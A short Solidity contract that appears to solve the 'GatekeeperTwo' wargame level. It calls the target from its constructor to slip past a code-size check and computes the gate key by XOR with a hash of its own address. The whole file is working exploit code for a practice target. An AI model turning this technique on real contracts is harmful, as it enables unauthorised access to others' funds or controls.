// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";

contract Solve {
    constructor() {
        GatekeeperTwo victim = GatekeeperTwo(0xF78C33d01Cd032DD22CBB83A55dF7749213527BE);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        victim.enter(key);
    }
}